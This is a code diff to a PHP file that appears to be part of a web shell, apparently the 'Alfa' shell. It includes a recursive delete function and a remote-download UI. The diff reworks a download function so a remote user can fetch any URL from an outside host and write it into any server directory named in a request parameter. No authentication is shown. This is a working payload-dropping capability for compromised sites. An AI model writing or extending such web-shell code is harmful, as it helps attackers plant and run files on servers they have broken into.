@@ -75,26 +75,61 @@ function perm_color($path){
 
 function xrmdir($d){$it=@scandir($d);if(!$it)return;foreach($it as $i){if($i=='.'||$i=='..')continue;$p="$d/$i";if(is_dir($p))xrmdir($p);else@unlink($p);}rmdir($d);}
 
-function __download_secure($url,$optname=''){
-  $base=getcwd();if(!is_dir($base))return['ok'=>false,'err'=>'Invalid dir','path'=>null];
-  if(!filter_var($url,FILTER_VALIDATE_URL))return['ok'=>false,'err'=>'Invalid URL','path'=>null];
-  $basename=basename(parse_url($url,PHP_URL_PATH)??'file.bin');
-  $basename=preg_replace('/[^A-Za-z0-9._-]/','_',$basename);
-  $filename=$optname?preg_replace('/[^A-Za-z0-9._-]/','_',basename($optname)):$basename;
-  $target=rtrim($base,'/')."/".$filename;
+function __download_secure($url, $optname=''){
+  // Simpan file di direktori yang sedang dibuka (dari UI)
+  $base = isset($_GET['path']) && is_dir($_GET['path']) ? realpath($_GET['path']) : getcwd();
+  $cwdBackup = getcwd(); // simpan cwd lama
+
+  @chdir($base); // pindah sementara
+
+  if (!filter_var($url, FILTER_VALIDATE_URL))
+    return ['ok'=>false,'err'=>'Invalid URL','path'=>null];
+
+  $basename = basename(parse_url($url, PHP_URL_PATH) ?? 'file.bin');
+  $basename = preg_replace('/[^A-Za-z0-9._-]/','_',$basename);
+  $filename = $optname
+    ? preg_replace('/[^A-Za-z0-9._-]/','_',basename($optname))
+    : $basename;
+
+  $target = $base . DIRECTORY_SEPARATOR . $filename;
   $ok=false;$err='';
-  if(function_exists('curl_init')){
+
+  if (function_exists('curl_init')) {
     $ch=curl_init($url);$fp=@fopen($target,'w');
-    if($fp){curl_setopt_array($ch,[CURLOPT_FILE=>$fp,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_TIMEOUT=>90]);
-      curl_exec($ch);$cerr=curl_error($ch);$code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
+    if($fp){
+      curl_setopt_array($ch,[
+        CURLOPT_FILE=>$fp,
+        CURLOPT_FOLLOWLOCATION=>true,
+        CURLOPT_TIMEOUT=>90,
+        CURLOPT_FAILONERROR=>true
+      ]);
+      curl_exec($ch);
+      $cerr=curl_error($ch);
+      $code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
       curl_close($ch);fclose($fp);
-      if(!$cerr&&$code<400&&is_file($target))$ok=true;else{@unlink($target);$err=$cerr?:$code;}
+      if(!$cerr && $code<400 && is_file($target)) $ok=true;
+      else{@unlink($target);$err=$cerr?:("HTTP ".$code);}
     }else $err='Write fail';
   }
-  if(!$ok){$d=@file_get_contents($url);if($d!==false&&@file_put_contents($target,$d)!==false)$ok=true;else$err=$err?:'Download failed';}
+
+  if(!$ok){
+    $data=@file_get_contents($url);
+    if($data!==false && @file_put_contents($target,$data)!==false)
+      $ok=true;
+    else $err=$err?:'Download failed';
+  }
+
   if($ok)@chmod($target,0644);
-  return['ok'=>$ok,'err'=>$err,'path'=>$target];
+
+  // Kembalikan working directory
+  @chdir($cwdBackup);
+
+  // Path relatif untuk tampilan
+  $relative = str_replace($cwdBackup, '.', realpath($target));
+
+  return ['ok'=>$ok,'err'=>$err,'path'=>$relative];
 }
+
 
 function alfaremotedl(){
   echo"<div style='background:#0b0b10;padding:14px;border-radius:8px;margin:15px auto;max-width:950px;box-shadow:0 0 10px rgba(110,70,255,0.3);'>";
